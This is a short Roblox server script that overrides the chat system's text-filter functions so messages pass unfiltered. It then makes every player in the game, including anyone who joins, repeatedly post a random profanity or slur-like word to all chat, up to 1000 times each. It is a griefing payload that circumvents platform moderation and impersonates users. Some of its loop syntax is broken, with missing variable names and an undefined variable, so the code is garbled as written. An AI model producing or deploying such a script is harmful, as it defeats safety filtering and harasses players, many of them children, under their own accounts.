task.wait(3)

local Players = game:GetService("Players")
local sv = game:GetService("ServerScriptService")

local ChatServiceRunner = sv:WaitForChild("ChatServiceRunner", math.huge)
local ChatServiceModule = require(ChatServiceRunner:WaitForChild("ChatService", math.huge))

local CONFIG = {
   Phrases = {
      "fuck",
      "shit",
      "gay",
   },
   spamAmount = 1000,
}

ChatServiceModule.InternalApplyRobloxFilterNewAPI = function(self, speakerName, messageContent, textFilterIcon)
   return true, false, messageContent
end

ChatServiceModule.InternalApplyRobloxFilter = function(self, speakerName, messageContent, textFilterIcon)
   return messageContent
end

local function hehe(player)
   local speaker = ChatServiceModule:GetSpeaker(player.Name)
   local chosephrase = CONFIG.Phrases[math.random(1,#CONFIG.Phrases)]
   for = 1, CONFIG.spamAmount do
      speaker:SayMessage(chosephrase, "All")
      task.wait(math.random(0, 5))
   end
end

for , plr in ipairs(Players:GetPlayers()) do
   task.spawn(pcall, hehe, player)
end

Players.PlayerAdded:Connect(function(funni)
   pcall(hehe, funni)
end)
